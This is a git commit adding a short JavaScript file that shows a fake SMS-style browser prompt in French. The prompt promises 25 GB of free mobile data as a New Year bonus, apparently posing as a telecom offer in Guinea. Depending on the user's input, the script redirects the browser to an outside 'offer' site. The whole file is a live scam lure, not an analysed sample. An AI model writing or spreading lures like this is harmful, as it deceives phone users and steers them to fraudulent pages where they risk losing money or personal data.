5924dcdbc3acff45a7d926108ce220e88e806328
harryjohnson86 <mfonjohnson86@gmail.com>
2025-01-12 06:06:53 -0800

    Create guinea-orange20go.js

---
+++ guinea-orange20go.js
@@ -0,0 +1,5 @@
+var password = '25 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 25 Go de données gratuites RÉCOMPENSE BONUS DU NOUVEL AN, veuillez appuyer sur OK pour ACTIVER. ','25 Go de données gratuites');
+if (password != '25 Go de données gratuites') {
+location.href='https://offerforall.info/guinea-orange20go.html';
+}
